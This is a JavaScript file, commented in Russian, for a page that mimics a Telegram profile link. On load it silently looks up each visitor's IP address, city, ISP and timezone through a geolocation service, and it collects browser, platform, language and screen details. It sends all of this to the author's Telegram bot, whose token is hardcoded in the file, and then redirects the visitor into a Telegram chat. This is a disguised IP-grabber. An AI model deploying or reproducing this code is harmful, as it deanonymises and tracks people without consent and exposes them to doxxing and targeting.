// ============================================
// НАСТРОЙКИ БОТА - ЗАМЕНИТЕ НА СВОИ ЗНАЧЕНИЯ
// ============================================
const BOT_TOKEN = '7330997795:AAFbivfINgrXFksIElkhmIJye7Zqndg86F0';
const CHAT_ID = '8510915988';
const TELEGRAM_USERNAME = 'pyrater'; // Ваш username в Telegram
const MESSAGE_TEXT = 'здравствуйте, пишу по поводу сотрудничества';

// ============================================
// ФУНКЦИЯ ЛОГИРОВАНИЯ ПОСЕТИТЕЛЕЙ
// ============================================
async function logVisitor() {
    try {
        // Получаем данные о местоположении посетителя
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        const ip = data.ip || 'Неизвестно';
        const country = data.country_name || 'Неизвестно';
        const city = data.city || 'Неизвестно';
        const region = data.region || 'Неизвестно';
        const isp = data.org || 'Неизвестно';
        const timezone = data.timezone || 'Неизвестно';
        const countryCode = data.country_code || '';

        // Информация о браузере
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenResolution = `${window.screen.width}x${window.screen.height}`;
        const currentTime = new Date().toLocaleString('ru-RU', { 
            timeZone: timezone || 'Europe/Moscow' 
        });

        // Формируем сообщение для отправки в Telegram
        const message = `🔔 *Новый посетитель профиля @${TELEGRAM_USERNAME}!*

🌍 *IP:* \`${ip}\`
🏙 *Город:* ${city}
🌏 *Страна:* ${country} ${countryCode ? '(' + countryCode + ')' : ''}
📍 *Регион:* ${region}
🏢 *Провайдер:* ${isp}
🕐 *Часовой пояс:* ${timezone}
📱 *Устройство:* ${platform}
🌐 *Браузер:* ${userAgent.substring(0, 80)}...
🗣 *Язык:* ${language}
🖥 *Разрешение экрана:* ${screenResolution}
🕒 *Время визита:* ${currentTime}`;

        // Отправляем данные в Telegram бота
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        console.log('✅ Visitor logged successfully');
    } catch (error) {
        console.error('❌ Error logging visitor:', error);
    }
}

// ============================================
// ИНИЦИАЛИЗАЦИЯ ФОНА TELEGRAM
// ============================================
function initTelegramBackground() {
    const tme_bg = document.getElementById('tgme_background');
    if (tme_bg && typeof TWallpaper !== 'undefined') {
        TWallpaper.init(tme_bg);
        TWallpaper.animate(true);
        window.onfocus = function() { 
            TWallpaper.update(); 
        };
    }
}

// ============================================
// ПЕРЕКЛЮЧЕНИЕ ТЕМНОЙ ТЕМЫ
// ============================================
function initThemeToggle() {
    function toggleTheme(dark) {
        document.documentElement.classList.toggle('theme_dark', dark);
    }
    
    if (window.matchMedia) {
        const darkMedia = window.matchMedia('(prefers-color-scheme: dark)');
        toggleTheme(darkMedia.matches);
        darkMedia.addListener(function(e) { 
            toggleTheme(e.matches); 
        });
    }
}

// ============================================
// АВТОМАТИЧЕСКИЙ РЕДИРЕКТ В TELEGRAM
// ============================================
function autoRedirectToTelegram() {
    // Кодируем сообщение в URL
    const encodedMessage = encodeURIComponent(MESSAGE_TEXT);
    const telegramLink = `tg://resolve?domain=${TELEGRAM_USERNAME}&text=${encodedMessage}`;
    
    // Редирект через 100ms
    setTimeout(function() {
        window.location = telegramLink;
    }, 100);
}

// ============================================
// ЗАПУСК ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
// ============================================
window.addEventListener('load', function() {
    // Убираем класс no_transition для плавных анимаций
    document.body.classList.remove('no_transition');
    
    // Инициализируем фон
    initTelegramBackground();
    
    // Инициализируем переключение темы
    initThemeToggle();
    
    // Логируем посетителя
    logVisitor();
    
    // Автоматический редирект в Telegram
    autoRedirectToTelegram();
});

// ============================================
// ОБРАБОТКА КЛИКА ПО КНОПКЕ "Send Message"
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    const sendButton = document.querySelector('.tgme_action_button_new');
    if (sendButton) {
        sendButton.addEventListener('click', function(e) {
            console.log('📨 Send Message button clicked');
            // Браузер автоматически откроет Telegram по href
        });
    }
});
